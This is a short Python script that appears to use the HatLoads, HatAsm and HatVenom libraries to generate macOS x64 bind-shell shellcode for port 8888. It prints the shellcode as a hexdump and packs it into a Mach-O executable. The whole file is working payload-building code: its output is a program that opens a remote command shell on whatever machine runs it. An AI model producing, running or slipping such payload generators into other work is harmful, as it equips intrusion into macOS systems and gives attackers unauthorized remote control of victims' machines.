#!/usr/bin/env python3

from hatasm import HatAsm
from hatloads import HatLoads
from hatvenom import HatVenom

hatasm = HatAsm()
hatloads = HatLoads()
hatvenom = HatVenom()

options = {
    'RHOST': '127.0.0.1',
    'RPORT': 8888
}

print("[*] Assembling shellcode...")
shellcode = hatloads.get_payload('macos', 'x64', 'shell_bind_tcp', options)

print("[i] Generated shellcode:")
for line in hatasm.hexdump(shellcode):
    print(line)

print("[*] Writing shellcode to Mach-O...")
hatvenom.generate_to('macho', 'x64', shellcode)
